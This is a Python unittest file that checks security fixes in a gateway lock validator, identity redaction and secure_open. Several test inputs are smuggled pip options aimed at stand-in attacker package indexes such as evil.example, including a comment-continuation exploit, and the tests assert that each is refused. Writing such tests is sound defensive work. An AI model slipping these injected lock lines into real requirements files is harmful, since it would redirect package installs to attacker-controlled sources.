"""Patch C1 + C2 review-fix tests (Software Engineer, 2026-10-19).

Covers the C1 changes:
  * MED-1: remote_agent.validate_gateway_lock refuses any non---hash token after
    name==version, and tools/make_gateway_lock.wheel_name_version charset-validates
    the name/version so the generated lock can never carry a pip option.
  * E2/LOW-3/N1: model.redact_identity is case-insensitive for BOTH login and host
    and FAILS CLOSED (RedactionError, a ValueError) on empty/None/whitespace input.
  * LOW-4: model.secure_open adds O_NOFOLLOW where the platform has it.

...and the Patch C2 re-closure of MED-1 (the validator and pip must never disagree
about where a line ends): validate_gateway_lock no longer joins backslash
continuations and now REFUSES any lock containing a backslash anywhere, or any
control character other than '\n' (including '\r', '\x0b', '\x0c', '\u2028').
The former test_accepts_comments_blanks_and_backslash_continuation is replaced by
test_accepts_comments_and_blanks_without_continuation (comments/blanks still ignored,
but every requirement is a single physical line), plus the five
test_c2_* cases below.

These are pure-logic tests (no network/SSH/subprocess/tkinter). POSIX-only bits use
stubs. Synthetic placeholder values only (fakeuser / 192.0.2.77 / host.example /
'a'*64, 'b'*64 hashes); no real login/host/token.
"""
import importlib
import os
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
# tools/ has no __init__.py; match test_bootstrap.py and import the module directly.
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'tools'))

import model
from model import redact_identity, RedactionError, secure_open, REDACTED_USER, REDACTED_HOST
import remote_agent
from remote_agent import validate_gateway_lock
import quick_reg
make_gateway_lock = importlib.import_module('make_gateway_lock')


HASH_A = '--hash=sha256:' + ('a' * 64)
HASH_B = '--hash=sha256:' + ('b' * 64)


class TestGatewayLockOnlyHashTokens(unittest.TestCase):
    """MED-1: after name==version, every token must be --hash=sha256:<64 hex>."""

    def _refused(self, blob_text):
        with self.assertRaises(ValueError):
            validate_gateway_lock(blob_text.encode('utf-8'))

    def test_accepts_well_formed_single_hash(self):
        validate_gateway_lock(('mcp==2.3.0 ' + HASH_A).encode('utf-8'))

    def test_accepts_well_formed_multi_hash_line(self):
        validate_gateway_lock(('mcp==2.3.0 ' + HASH_A + ' ' + HASH_B).encode('utf-8'))

    def test_accepts_comments_and_blanks_without_continuation(self):
        # Patch C2: continuation support is removed; comments and blank lines are
        # still ignored, but each requirement is a single physical line (no '\\').
        blob = ('# header\n'
                'mcp==2.3.0 ' + HASH_A + ' ' + HASH_B + '\n'
                '\n'
                'botocore==1.2.3 ' + HASH_B + '\n')
        validate_gateway_lock(blob.encode('utf-8'))

    # --- Patch C2: validator and pip must never disagree about line ends ---
    def test_c2_refuses_any_backslash_anywhere(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' \\\n    ' + HASH_B)

    def test_c2_refuses_exact_three_line_comment_continuation_exploit(self):
        # pip's join_lines never continues a COMMENT line, so a validator that
        # joined continuations first would swallow line 3 into the comment and
        # accept the lock while pip would honour '--index-url' as a real option.
        exploit = ('mcp==2.3.0 --hash=sha256:' + ('0' * 64) + '\n'
                   '# note \\\n'
                   '--index-url https://evil.example/simple\n')
        self._refused(exploit)

    def test_c2_refuses_comment_line_ending_in_backslash(self):
        self._refused('# trailing slash \\\nmcp==2.3.0 ' + HASH_A)

    def test_c2_accepts_single_line_multi_hash(self):
        # A single physical line with two hashes is still accepted (synthetic
        # 'a'*64 / 'b'*64 hashes used only inside this test).
        validate_gateway_lock(('mcp==2.3.0 ' + HASH_A + ' ' + HASH_B).encode('utf-8'))

    def test_c2_refuses_control_characters(self):
        for ctrl in ('\x0b', '\x0c', '\u2028'):
            self._refused('mcp==2.3.0 ' + HASH_A + ctrl + 'botocore==1.2.3 ' + HASH_B)

    def test_refuses_index_url_after_hash(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' --index-url http://evil')

    def test_refuses_extra_index_url_after_hash(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' --extra-index-url http://evil')

    def test_refuses_find_links_after_hash(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' --find-links /somewhere')

    def test_refuses_dash_r_after_hash(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' -r other.txt')

    def test_refuses_at_url_direct_reference(self):
        self._refused('mcp @ https://example.invalid/mcp.whl ' + HASH_A)

    def test_refuses_trailing_inline_comment(self):
        self._refused('mcp==2.3.0 ' + HASH_A + ' # trust me')

    def test_refuses_standalone_option_line(self):
        self._refused('--index-url http://evil\nmcp==2.3.0 ' + HASH_A)

    def test_still_refuses_missing_hash(self):
        self._refused('mcp==2.3.0')

    def test_still_refuses_template_placeholder(self):
        self._refused('mcp==2.3.0 --hash=sha256:REPLACE_WITH_REAL_HASH')

    def test_still_refuses_short_hash(self):
        self._refused('mcp==2.3.0 --hash=sha256:' + ('a' * 63))

    def test_still_refuses_nonhex_hash(self):
        self._refused('mcp==2.3.0 --hash=sha256:' + ('g' * 64))

    def test_still_refuses_uppercase_hex_hash(self):
        self._refused('mcp==2.3.0 --hash=sha256:' + ('A' * 64))

    def test_still_refuses_empty_lock(self):
        self._refused('# only a comment\n\n')


class TestMakeGatewayLockGeneratorCharset(unittest.TestCase):
    """MED-1 belt-and-suspenders: the generator cannot emit a non-wheel/option token."""

    def test_real_wheel_names_parse(self):
        self.assertEqual(make_gateway_lock.wheel_name_version('mcp-2.3.0-py3-none-any.whl'),
                         ('mcp', 'mcp', '2.3.0'))
        self.assertEqual(make_gateway_lock.wheel_name_version('botocore-1.43.113-py3-none-any.whl')[2],
                         '1.43.113')

    def test_exotic_filenames_are_rejected_as_non_wheels(self):
        for bad in ('mcp 2.3.0 --index-url=x-9.9-none.whl', 'ev@l-1.0-none.whl', 'x-1.0#c-none.whl'):
            self.assertEqual(make_gateway_lock.wheel_name_version(bad), (None, None, None))


class TestRedactIdentityCaseInsensitiveFailClosed(unittest.TestCase):
    """E2/LOW-3/N1: case-insensitive login AND host; fail closed on empty."""

    def test_uppercase_login_is_redacted(self):
        out = redact_identity('ssh FAKEUSER@192.0.2.77 now', 'fakeuser', '192.0.2.77')
        self.assertNotIn('FAKEUSER', out)
        self.assertNotIn('192.0.2.77', out)
        self.assertIn(REDACTED_USER + '@' + REDACTED_HOST, out)

    def test_uppercase_host_is_redacted(self):
        out = redact_identity('connect fakeuser@HOST.EXAMPLE ok', 'fakeuser', 'host.example')
        self.assertNotIn('HOST.EXAMPLE', out.replace(REDACTED_HOST, ''))

    def test_home_path_and_dns_host_still_redacted(self):
        out = redact_identity('-T -q fakeuser@gateway.example.com /home/fakeuser/aq-mcp/aq-run.sh epg',
                              'fakeuser', 'gateway.example.com')
        self.assertNotIn('fakeuser', out)
        self.assertNotIn('gateway.example.com', out)
        self.assertIn('/home/' + REDACTED_USER + '/aq-mcp', out)

    def test_none_text_passthrough(self):
        self.assertIsNone(redact_identity(None, 'fakeuser', '192.0.2.77'))

    def test_empty_or_whitespace_user_fails_closed(self):
        for bad in ('', '   ', None):
            with self.assertRaises(RedactionError):
                redact_identity('x fakeuser@192.0.2.77', bad, '192.0.2.77')

    def test_empty_or_whitespace_host_fails_closed(self):
        for bad in ('', '   ', None):
            with self.assertRaises(RedactionError):
                redact_identity('x fakeuser@192.0.2.77', 'fakeuser', bad)

    def test_redaction_error_is_value_error(self):
        self.assertTrue(issubclass(RedactionError, ValueError))


class TestRedactionCallersFailClosed(unittest.TestCase):
    """Callers refuse the shareable variant rather than emit unredacted text."""

    def _spec(self, user='fakeuser', host='192.0.2.77'):
        return {'host': host, 'user': user, 'kind': 'lambda', 'target': 'epg-demo',
                'display_name': 'AQ EPG Demo',
                'url': 'https://example123.lambda-url.us-west-2.on.aws/mcp',
                'allow': ['get_programs']}

    def test_config_export_text_redacted_has_no_identity(self):
        txt = quick_reg.config_export_text(self._spec(user='FAKEUSER'), redacted=True)
        self.assertNotIn('FAKEUSER', txt)
        self.assertNotIn('192.0.2.77', txt)

    def test_quick_instructions_redacted_has_no_identity(self):
        txt = quick_reg.quick_instructions(self._spec(user='FAKEUSER'), redacted=True)
        self.assertNotIn('FAKEUSER', txt)
        self.assertNotIn('192.0.2.77', txt)

    def test_config_export_text_redacted_fails_closed_on_empty_identity(self):
        # An empty/whitespace identity never yields a half-redacted shareable export:
        # the caller fails closed with a ValueError (ValidationError from validate_spec,
        # or RedactionError from redact_identity) and emits nothing. Both subclass
        # ValueError; the direct redact_identity fail-closed path is asserted above.
        with self.assertRaises(ValueError):
            quick_reg.config_export_text(self._spec(user='fakeuser', host='   '), redacted=True)


class TestSecureOpenNoFollow(unittest.TestCase):
    """LOW-4: secure_open includes O_NOFOLLOW where the platform has it."""

    def test_secure_open_passes_o_nofollow_flag(self):
        import tempfile
        captured = {}
        real_open = os.open

        def fake_open(path, flags, mode=0o777):
            captured['flags'] = flags
            fd, tmp = tempfile.mkstemp()
            captured['tmp'] = tmp
            return fd

        nofollow = getattr(os, 'O_NOFOLLOW', 0)
        orig_fchmod = getattr(os, 'fchmod', None)
        try:
            os.open = fake_open
            if hasattr(os, 'fchmod'):
                os.fchmod = lambda fd, m: None
            try:
                fd = secure_open('/tmp/does-not-matter')
                os.close(fd)
            except Exception:
                pass
        finally:
            os.open = real_open
            if orig_fchmod is not None:
                os.fchmod = orig_fchmod
            if captured.get('tmp') and os.path.exists(captured['tmp']):
                os.unlink(captured['tmp'])
        self.assertIn('flags', captured)
        if nofollow:
            self.assertTrue(captured['flags'] & nofollow,
                            'secure_open must set O_NOFOLLOW where available')
        self.assertTrue(captured['flags'] & os.O_EXCL)
        self.assertTrue(captured['flags'] & os.O_CREAT)


if __name__ == '__main__':
    unittest.main()
